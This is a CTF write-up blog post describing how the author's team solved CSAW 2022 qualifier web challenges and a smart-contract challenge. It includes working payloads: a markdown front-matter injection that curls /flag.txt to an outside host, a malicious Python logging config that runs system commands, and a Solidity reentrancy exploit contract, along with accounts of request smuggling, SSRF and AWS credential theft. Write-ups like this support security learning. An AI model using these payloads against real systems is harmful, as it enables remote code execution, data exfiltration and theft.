---
title: "CSAW 2K22 Quals - Writeups"
date: 2022-09-11
cover-image-large: "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609975/large_csaw_blog_main_98bebe18a4.jpg"
cover-image-small: "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663609977/small_csaw_blog_main_98bebe18a4.jpg"
tags: [Cybersecurtiy, Writeups, Event, CTF,S0ter14]
---

# CSAW 2K22 Quals

My team Soter1a and I have participated in CSAW 2k22 Quals. Hope you enjoy my writeup for all Web tasks and one misc one ^^. 

## World wide web

![World wide web](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/world-wide-web_xlvzqa.png)
![world wide web root](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-firstly_dvcthr.png)  

![world wide web /stuff](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608174/csaw/world-wide-web-secondly_iahju2.png)  

I tried to find if there is any other **<a>** tags in the page.

![world wide web terminal curl](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608171/csaw/world-wide-web-third_qwc7dw.png)

Using browser devtool and CTRL+F I did 3 times each time I look for the **<a>** and click on it. Also I noticed that I got a very interesting cookie set.

![world wide web cookie](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608168/csaw/world-wide-web-cookie_sxiiau.png)

**solChain** well what got my attention is the chain part. If the server is actually tracking the sequence of path I have visited then there must be something. Also, I tried to repeat the process twice and I found out the sequence of words is the same.

Crafting my final script....

```py
import requests

url="http://web.chal.csaw.io:5010/"


session = requests.Session()


with session : 
    next_word='stuff'
    while True:
        response1= session.get(url+next_word)
        print(session.cookies)
        try:
            startingIndex=response1.text.index('href="/')
            endText=response1.text[startingIndex:].index('">')
        except :
            print(response1.text)
            break
        print("next word:",response1.text[7+startingIndex:endText+startingIndex])
        next_word=response1.text[7+startingIndex:endText+startingIndex]
```

![world-wide-web-flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/world-wide-web-flag_dtwoou.png)  

## My Little website

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/my-little-website_yp34fj.png)

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-challenge-pic_xuyuqc.png)

So as far my enumeration went that's what I found:

- **expressJS** server running, identified with the headers.
- Opens a headless chrome instance to render the pdf.
- Dynamic XSS didn't work, might be beacuse the bot doesn't wait for the JS execution and even forcing it to wait doesn't really work it renders the HTML,CSS and then the PDF.

A wild guess by my teammate **M0ngi** about the markdown parser, the CVE was *CVE-2021-23639* which occurs in the vulnerable version of *md-to-pdf*.

So we execute our final payload.

```md
---js
((require("child_process")).execSync("curl https://en7nqjdbzyckx.x.pipedream.net/ -d \"$(cat /flag.txt)\" "))
---
```

![my little website](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/my-little-website-flag_sqrb1m.png)

## Good Intentions

![Good intentions](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/good-intentions_q5rbw9.png)

Reading through the code, I found that the upload is secure.
![Secure upload](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608180/csaw/secure-upload_cs0nrd.png)

But going further down the code the function to set the **logger** configuration file is vulnerable to **path traversal**.

![Unsecure Log set](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608175/csaw/unsecure_logconf_gan7js.png)

Here, I didn't know which evil configuration should I **upload** then set the logger to. I needed to have RCE on the server. Fortunately enough, my teammate **n0s** sent me this link  of an [Evil logger](https%3A%2F%2Fgithub.com%2Fraj3shp%2Fpython-logging.config-exploit%2Fblob%2Fmain%2Fexploit%2Fbad-logger.conf%3Ffbclid%3DIwAR0W2Cdm3GLHqtFbAQjU3iatoSSTnlbj-kuUP_FYX3jYVHTvDvH7LrneBW4&h=AT2QW5JZ9Xo6Qxu0-PtnFRXvizekY-KwhalZdV6aiTe0nGrJKkLDiGvLKFysZp_1QIS5xBW03o98eLDuK-LJYfHx4uSZwRB05MOYG7pu420p1iUPViifuWgRXOQHSLMjihPiJQ).

So the final chain will be as the following:

![good-intentions-request-chain](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608204/csaw/good-intentions-request-chain_wf7er2.png)

### Logger code **payload.conf**

```yaml
[loggers]
keys=root,simpleExample

[handlers]
keys=consoleHandler

[formatters]
keys=simpleFormatter

[logger_root]
level=DEBUG
handlers=consoleHandler

[logger_simpleExample]
level=DEBUG
handlers=consoleHandler
qualname=simpleExample
propagate=0

[handler_consoleHandler]
class=__import__('os').system('cat /flag.txt > /app/application/static/images/de5fb214024af96b9f49ace64886c5/payload_ca36a4c20fafe498f263')
level=DEBUG
formatter=simpleFormatter
args=(sys.stdout,)

[formatter_simpleFormatter]
format=%(asctime)s - %(name)s - %(levelname)s - %(message)s
```

I fired up my postman to execute that and here comes the flag !
![Flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608207/csaw/Flag_zjj7z6.png)

## Smuggling Mail

![Smuggling mail](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail_kotgch.png)  

Going through the code, these are my findings:

- We got a **varnich** cache server.

![Smuggling-mail-varnish-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608173/csaw/smuggling-mail-varnish-config_vlwtw8.png)  

- A **hitch** TLS proxy accepting HTTP/2 requests.
![smuggling-mail-hitch-conf](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608177/csaw/smuggling-mail-hitch-conf_t1dsbh.png)

A quick research on the **varnish** cache server and I found the **CVE-2021-36740**. Actually, the cache server which works as the "frontend" here passes the HTTP/2 to the backend which downgrades the request to HTTP/1 which will be handled as two requests. Yes, that's a H2.CL vulnerability also there is a cve that made me try to HTTP Smuggling exploit.

![smuggling-mail cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608178/csaw/smuggling-mail-cve_s6xc02.png)

That's perfectly our case, we want to bypass the authentication condition in the **varnish** config.
![smuggling-mail to bypass](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-to-bypass_mlxaam.png)

We can use the **/waitlist** endpoint for the original request but what do we want to do here ?
![smuggling-mail RCE code](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-rce-code_lze7hw.png)  

So we want to reach the **/admin/alert** to trigger an RCE but how can we do it ? Some research and with the help of my teammate 'm0ngi' We found the last missing piece [Mailutils cve](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-mail-cve_vwprts.png)

> We can **~ OUR_COMMAND**

### Putting it all together

![smuggling mail request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608176/csaw/smuggling-mail-trigger-request_zcuwoo.png)
![Smuggling mail rce ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608179/csaw/smuggling-mail-rev-shell_nubljz.png)

## Lost in Amazon

![Lost in amazon](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/losti-in-amazon_topqca.png)  

> This challenge was a little bit too blind. What caused confusion is the directory busting part. It's not a natural thing to come to your mind while solving a CTF task.

I was really confused and couldn't find a thing till I got a discord notification.

![Lost in Amazon Discord](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608187/csaw/lost-in-amazon-discord_vbgepl.png)  

Well, a quick directory busting with **wfuzz**, I found two endpoints.
![Lost in amazon Wfuzz output 1 ](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-wfuzz-1_qjhpzv.png)  

I curled both paths, **/secret** gave me a JWT and **rockyou** a page that has nothing in it. 
![Lost in amazzon Confusion](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608198/csaw/lost-in-amazon-token-lost_rninuu.png)  

An intuitive move is to set the jwt token and revisit **/rockyou** right ? It gave me nothing. I tried to set **secret** cookie as the JWT too but nothing ...  also we should note that jwt itself has nothing interesting. I felt really like I hit a dead end.
![picture 18](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608185/csaw/lost-in-amazon-jwt-check_igswk3.png)  

At last, I reached for the admin, I knew that there was something unintuitive to do **also noting the cries of agony in the discord channel because of the task**
![Lost in amazon HINT](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-hint_c7cdii.png)  

Oh I see I had to fuzz one path deeper and found **/developer/heaven**
![Lost in amazon dirbusting depths 2](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608205/csaw/lost-in-amazon-dirb_bjnbne.png)  
![Lost in amazon /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608219/csaw/lost-in-amazon-findings2_sfiezz.png)  

Now I have an idea why do I need the JWT token. I added a cookie with the name of **secret**.
![Lost in amazon access /developer/heaven](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608215/csaw/lost-in-amazon-access_zf2ld5.png)  

It was really easy now. Going back to the name of the Task and especially the **amazon** part. I knew it was an amazon SSRF vulnerability.
I didn't waste any time.

> I tried tempering with the _magiccall paramater but it gave nothing so I passed.

![Lost in amazon aws creds](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608194/csaw/lost-in-amazon-creds_df6cet.png)  

I added the profile to my **aws-cli**.
![Lost in amazon aws configure](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608193/csaw/lost-in-amazon-aws-config_nzybus.png)  

Then I tried to look for any **s3 buckets**
![Lost in amazon s3 error](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608184/csaw/lost-in-amazon-s3_ie3fcj.png)  

My teammate **N0s** pinged me here and told me to try to specify the bucket region as buckets can be region-specific. So I looked for it
![Lost in amazon finding region](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608186/csaw/lost-in-amazon-region_tcoilm.png)  

and finally I got the flag.
![Lost in amazon flag](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608189/csaw/lost-in-amazon-flag-aws_qr4uzq.png)

## DonateMe

![Donate more](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1663608208/csaw/donate-more_efrhig.png)  

A basic **reentrancy vulnerability**. I crafted an evil contract to exploit it.

1. Send 0.0001 ether to trigger the reentrancy loop.
2. Stop the loop after the balance gets to 30.
3. Send the token via **getFlag**
   > You can use ethers.utils.formatBytes32String(TOKEN) to get the right format to pass.
4. **yes** and get the flag.

```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.7;    

interface VictimContract { 
    function newAccount()  external payable;

    function donateOnce()  external;

    function getBalance() external view returns (uint256 donatorBalance) ;
    function getFlag(bytes32 _token) external ;
}

contract ExploitDonation { 
    address public victimAddress;
    VictimContract victimContract; 

    constructor(address _victimAddress){
            victimAddress=_victimAddress;
            victimContract=VictimContract(victimAddress);
    }

    function startAttack() public payable {
        victimContract.newAccount{value:msg.value}();
        victimContract.donateOnce();

    }

    fallback()external payable {
        uint my_balance= victimContract.getBalance();
        if (my_balance<=20)
            victimContract.donateOnce();

    }

 function getBalance() public view returns (uint256) {
        return victimContract.getBalance();
    }

    function getFlag(bytes32 _token) public {
        victimContract.getFlag(_token);
    }
}
```

## Final words

I want to congratulate the organizers for their huge efforts and these great tasks.
Kudos to all my teammates for their perseverance and hard work during the competition. We successfully made it to the finals by achieving the first place in MENA !! Many words but not enough of them, all the efforts put to get such results, but most importantly **CSAW 2K22 finals here we come**.


## Links
- [Github Repo](https://github.com/yassinebk/ctf-writeups/blob/main/csaw-2k22-qual/README.md)
- [N0s Writeup](https://blog.anas-cherni.me/2022/09/14/csaw2k22/)
- [Raf² & Adam](https://4n6nk8s.tech/2022/09/12/Writeups/csaw2022/?fbclid=IwAR2lkfD8gD6AggLv-c1P_tFP1PdK607fKFf4Rg5Ozi597A6lHdKlfM80wsw)
- [Ironbyte](https://l.facebook.com/l.php?u=https%3A%2F%2Fironbyte.me%2Fezmaze%2F%3Ffbclid%3DIwAR1UWnHRheApKCK7MtfcN_6lOBeSLEecT5NLBSETDwITNu-6bNPCnw497uA&h=AT14Q4UItbyzfDyj05vOBfFIIKwME3bO40gyNJOqD3UR4a2bex6wsRTEk26B9c6GQdjVbxako_OZtruE3LkafzkaiL_aXfDFmo0W0RiOwke5hiQxeQMt1sFjz7zYx2nkUAy8Gw)